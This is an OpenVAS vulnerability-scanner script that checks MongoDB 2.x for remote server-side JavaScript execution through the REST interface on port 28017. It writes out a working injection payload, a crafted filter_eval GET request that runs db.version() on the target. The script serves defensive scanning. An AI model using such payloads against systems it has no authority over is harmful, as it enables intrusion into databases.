###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mongodb_ssjs_remote_code_execution.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# MongoDB REST Interface Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:mongodb:mongodb";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103870");
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("MongoDB REST Interface Remote Code Execution Vulnerability");


  script_xref(name:"URL", value:"http://en.securitylab.ru/lab/PT-2012-40");
  script_xref(name:"URL", value:"http://blog.ptsecurity.com/2012/11/attacking-mongodb.html");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-01-08 13:56:18 +0100 (Wed, 08 Jan 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_mongodb_webadmin_detect.nasl");
  script_require_ports("Services/www", 28017);
  script_mandatory_keys("mongodb/webadmin/port");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to execute arbitrary code
  within the context of the affected application.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");

  script_tag(name:"insight", value:"If an attacker manages to call the REST interface that is running on port 28017
  by default, the attacker could execute SSJS code.");

  script_tag(name:"solution", value:"Update your software up to the latest version or disable the REST interface.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"MongoDB is prone to a remote code execution vulnerability because it
  fails to properly sanitize user-supplied input.");

  script_tag(name:"affected", value:"MongoDB 2.x is vulnerable.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_kb_item("mongodb/webadmin/port");
if ( ! port ) port = 28017;
if ( ! get_port_state( port ) ) exit( 0 );

vtstrings = get_vt_strings();
extra_check = '_' + vtstrings["lowercase_rand"];

url = '/admin/$cmd/?filter_eval=function%28%29%20{%20val=db.version%28%29;%20bar=val%2b%27' + extra_check  + '%27;%20return%20bar;%20}&limit=1';
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
if (!buf || 'REST is not enabled' >< buf )
  exit(0);

if ("total_rows" >< buf && "retval" >< buf && buf =~ '"retval" : "[0-9.]+' + extra_check) {
  report = 'It was possible to execute SSJS code on the remote mongodb.\n\nRequested URL: ' + url + '\nResponse: \n=====\n' + buf + '\n=====';
  security_message(port:port, data:report);
  exit(0);
}

exit(99);